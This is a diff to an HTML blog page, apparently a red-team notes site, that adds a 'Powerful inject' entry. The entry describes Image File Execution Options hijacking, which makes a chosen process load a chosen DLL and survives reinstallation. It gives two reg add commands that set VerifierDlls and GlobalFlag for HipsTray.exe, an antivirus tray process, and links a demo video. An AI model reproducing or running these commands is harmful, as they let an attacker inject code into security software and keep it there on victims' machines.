@@ -890,8 +890,11 @@
         
           
             <h1 id="Powerful-inject"><a href="#Powerful-inject" class="headerlink" title="Powerful inject"></a>Powerful inject</h1><blockquote>
-<p>暂不公开，可劫持国内任意杀软启动。</p>
+<p>镜像劫持，指定进程加载指定dll</p>
+<p>重装程序劫持依旧生效。</p>
 </blockquote>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add "hklm<span class="symbol">\S</span>OFTWARE<span class="symbol">\W</span>OW6432Node<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\I</span>mage File Execution Options<span class="symbol">\H</span>ipsTray.exe"  /v VerifierDlls /t REG_SZ /d test.dll</span><br><span class="line">reg add "hklm<span class="symbol">\S</span>OFTWARE<span class="symbol">\W</span>OW6432Node<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\I</span>mage File Execution Options<span class="symbol">\H</span>ipsTray.exe"  /v GlobalFlag /t REG_DWORD /d 256</span><br></pre></td></tr></table></figure>
+
 <p><video src="https://microsofts.oss-cn-hongkong.aliyuncs.com/Picture/360.mp4" controls="controls" style="max-width: 100%; display: block; margin-left: auto; margin-right: auto;"> your browser does not support the video tag </video></p>
 
           
